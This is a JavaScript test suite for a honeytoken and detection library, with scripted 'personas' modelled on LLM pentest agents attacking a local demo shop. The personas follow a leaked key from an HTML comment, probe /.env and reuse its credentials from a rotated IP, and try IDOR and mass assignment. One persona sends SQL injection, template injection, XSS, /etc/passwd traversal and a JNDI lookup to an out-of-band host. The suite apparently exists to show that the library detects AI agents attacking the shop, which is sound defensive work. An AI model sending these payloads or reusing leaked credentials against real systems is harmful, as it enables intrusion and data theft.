// Scripted versions of how LLM pentest agents behave, run against the demo
// shop. Each persona uses a different attacker strategy. The claim under test
// is that every attack behaviour triggers a detection, including for an agent
// that was told to ignore instructions embedded in pages.
import assert from 'node:assert/strict';
import { after, before, test } from 'node:test';
import { memorySink, verifyChain } from '@agenticslabs/kagami-express';
import { createApp } from '../app.js';

const BROWSER = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15';
const AGENT_UA = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Safari/537.36';

let base;
let server;
let app;
const sink = memorySink();

before(async () => {
  app = createApp({ secret: 'demo-shop-test-secret-0123456789abcdef-0123', sinks: [sink], logger: { warn() {} } });
  server = await new Promise((r) => {
    const s = app.listen(0, '127.0.0.1', () => r(s));
  });
  base = `http://127.0.0.1:${server.address().port}`;
});

after(async () => {
  await app.kagami.close();
  await new Promise((r) => server.close(r));
});

/** A small HTTP client that behaves like an agent's tool. It keeps cookies and a fixed identity. */
function client(identity) {
  const jar = new Map();
  // Every persona gets its own source address via X-Forwarded-For (trusted from loopback).
  const ip = identity.ip;
  return async (path, init = {}) => {
    const headers = { 'user-agent': identity.ua, 'x-forwarded-for': ip, ...(init.headers ?? {}) };
    if (jar.size) headers.cookie = [...jar].map(([k, v]) => `${k}=${v}`).join('; ');
    const res = await fetch(base + path, { ...init, headers, redirect: 'manual' });
    for (const c of res.headers.getSetCookie?.() ?? []) {
      const [kv] = c.split(';');
      const [k, v] = kv.split('=');
      jar.set(k.trim(), v);
    }
    return { status: res.status, text: await res.text(), headers: res.headers };
  };
}

const form = (o) => ({
  method: 'POST',
  headers: { 'content-type': 'application/x-www-form-urlencoded' },
  body: new URLSearchParams(o).toString(),
});

async function eventsFor(ip) {
  await app.kagami.flush();
  return sink.events.filter((e) => e.source?.ip === ip);
}

test('an honest customer who browses, searches, signs in and views orders raises zero alerts', async () => {
  const ip = '198.51.100.10';
  const http = client({ ip, ua: BROWSER });
  await http('/');
  await http('/products?category=jackets');
  await http('/products/3');
  await http('/search?q=O%27Neill+rain+shell');
  await http('/login', form({ email: 'demo@northwind.test', password: 'demo1234' }));
  await http('/account');
  const me = JSON.parse((await http('/api/me')).text);
  // A typical SPA pattern sends the whole object back with one change.
  await http('/api/me', { method: 'PATCH', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ ...me, name: 'Demo C.' }) });
  const { orders } = JSON.parse((await http('/api/orders')).text);
  for (const o of orders) assert.equal((await http(`/api/orders/${encodeURIComponent(o.id)}`)).status, 200);

  const events = await eventsFor(ip);
  assert.deepEqual(events.map((e) => e.rule), [], 'an honest customer must not raise a single alert');
});

test('persona 1, the curious agent, reads the page source and follows the leaked key', async () => {
  const ip = '203.0.113.21';
  const http = client({ ip, ua: AGENT_UA });
  const home = (await http('/')).text;
  const comment = /<!--([\s\S]*?)-->/.exec(home)?.[1];
  assert.ok(comment, 'protect mode embeds bait in HTML');
  const route = /(\/[a-z0-9/-]+)/.exec(comment)[1];
  const key = /sk_live_[A-Za-z0-9]{24}/.exec(comment)[0];

  const denied = await http(route);
  assert.equal(denied.status, 401);
  const dump = await http(route, { headers: { authorization: `Bearer ${key}` } });
  assert.equal(dump.status, 200);
  const data = JSON.parse(dump.text);
  assert.equal(data.data.length, 25, 'the agent sees a user table, but every record is fabricated');

  const rules = (await eventsFor(ip)).map((e) => e.rule);
  assert.ok(rules.includes('honeytoken.used') && rules.includes('session.flagged'), String(rules));
});

test('persona 2, the instruction-hardened agent, ignores page text and runs a standard checklist but is still caught', async () => {
  // This agent never reads comments or hidden text. It probes for leaked
  // config files (a checklist item every pentest agent runs) and then tries
  // what it found against the login form.
  const ip = '203.0.113.22';
  const http = client({ ip, ua: AGENT_UA });
  const env = await http('/.env');
  assert.equal(env.status, 200);
  const adminEmail = /^ADMIN_EMAIL=(.*)$/m.exec(env.text)[1];
  const adminPassword = /^ADMIN_PASSWORD=(.*)$/m.exec(env.text)[1];
  // Agents often rotate egress IPs between phases. Attribution still works.
  const rotated = client({ ip: '192.0.2.77', ua: 'python-httpx/0.27' });
  const login = await rotated('/login', form({ email: adminEmail, password: adminPassword }));
  assert.equal(login.status, 401, 'the fake credentials do not work on the real app');

  await app.kagami.flush();
  const used = sink.events.find((e) => e.rule === 'honeytoken.used' && e.source?.ip === '192.0.2.77');
  assert.ok(used, 'credential use detected');
  assert.equal(used.evidence.token_kind, 'env_admin_password');
  assert.equal(used.evidence.cross_source, true);
  const probe = (await eventsFor(ip)).find((e) => e.rule === 'bait.path');
  assert.equal(used.evidence.issued_to_source, probe.session.source.slice(0, 8), 'traced back to the machine that probed');
  assert.ok(sink.events.some((e) => e.rule === 'session.flagged' && e.evidence.linked_from_session), 'the probing session is linked and flagged');
});

test('persona 3, the careful agent, uses a real account without probing and tests IDOR and mass assignment', async () => {
  const ip = '203.0.113.23';
  const http = client({ ip, ua: AGENT_UA });
  await http('/login', form({ email: 'demo@northwind.test', password: 'demo1234' }));
  const me = JSON.parse((await http('/api/me')).text);
  const { orders } = JSON.parse((await http('/api/orders')).text);

  // IDOR test. Increment the order id.
  const [, num, sig] = /^(\d+)~(.+)$/.exec(orders[0].id);
  const neighbour = await http(`/api/orders/${Number(num) + 1}~${sig}`);
  assert.equal(neighbour.status, 404);
  const stripped = await http(`/api/orders/${Number(num) - 1}`);
  assert.equal(stripped.status, 404);

  // Mass assignment test. Escalate every privilege-looking field in the profile.
  const escalate = Object.fromEntries(Object.keys(me).filter((k) => /role|tier|scope|level|access|flags/.test(k)).map((k) => [k, 'admin']));
  assert.ok(Object.keys(escalate).length >= 2, `decoy field should be present in /api/me, keys are ${Object.keys(me)}`);
  await http('/api/me', { method: 'PATCH', headers: { 'content-type': 'application/json' }, body: JSON.stringify(escalate) });

  const rules = (await eventsFor(ip)).map((e) => e.rule);
  assert.ok(rules.includes('tamper.sealed_value'), String(rules));
  assert.ok(rules.includes('decoy.param'), String(rules));
  assert.ok(rules.includes('session.flagged'), String(rules));
});

test('persona 4, the noisy scanner, sprays payloads and enumerates a wordlist', async () => {
  const ip = '203.0.113.24';
  const http = client({ ip, ua: AGENT_UA });
  for (const q of ["' OR 1=1--", '{{7*7}}', '<script>alert(1)</script>', '../../../../etc/passwd', '${jndi:ldap://x.oast.fun/a}']) {
    await http(`/search?q=${encodeURIComponent(q)}`);
  }
  for (const w of ['admin', 'backup', 'old', 'test', 'dev', 'staging', 'api/v0', 'console', 'debug', 'private', 'config', 'db', 'logs', 'tmp', 'uploads', 'export', 'internal', 'beta', 'v2', 'graphql']) {
    await http(`/${w}`);
  }
  const rules = new Set((await eventsFor(ip)).map((e) => e.rule));
  for (const r of ['payload.sqli', 'payload.ssti', 'payload.xss', 'payload.traversal', 'payload.jndi', 'payload.oast', 'behavior.enumeration', 'session.flagged']) {
    assert.ok(rules.has(r), `missing ${r}; saw ${[...rules]}`);
  }
});

test('the full audit log is intact and contains no secrets', async () => {
  await app.kagami.flush();
  assert.equal(verifyChain(sink.lines).ok, true);
  const all = sink.lines.join('\n');
  assert.ok(!all.includes('demo1234'), 'real passwords never logged');
  assert.ok(!/sk_live_[A-Za-z0-9]{24}/.test(all), 'honeytokens are masked in logs');
  assert.ok(!/AKIA[A-Z2-7]{16}/.test(all), 'honeytokens are masked in logs');
});

// Regression tests from the first live benchmark round (2026-11-15). The
// agent reported these as real findings against the demo shop itself.

test('the demo shop never leaks stack traces, file paths or package names', async () => {
  const http = client({ ip: '203.0.113.31', ua: AGENT_UA });
  const probes = [
    ['/login', { method: 'POST', headers: { 'content-type': 'application/json' }, body: '{"a":' }],
    ['/login', { method: 'POST', headers: { 'content-type': 'application/json; charset=latin1' }, body: '{"email":"a"}' }],
    ['/login', { method: 'POST', headers: { 'content-type': 'application/json' }, body: '{"email":{"toString":1},"password":"x"}' }],
    ['/api/me', { method: 'PATCH', headers: { 'content-type': 'application/json' }, body: 'ÿþ{' }],
  ];
  for (const [path, init] of probes) {
    const res = await http(path, init);
    assert.ok(res.status >= 400 && res.status < 500, `${path} returned ${res.status}`);
    for (const leak of ['kagami', 'node_modules', 'body-parser', 'Desktop', '    at ']) {
      assert.ok(!res.text.includes(leak), `${path} response leaks "${leak}"`);
    }
  }
});
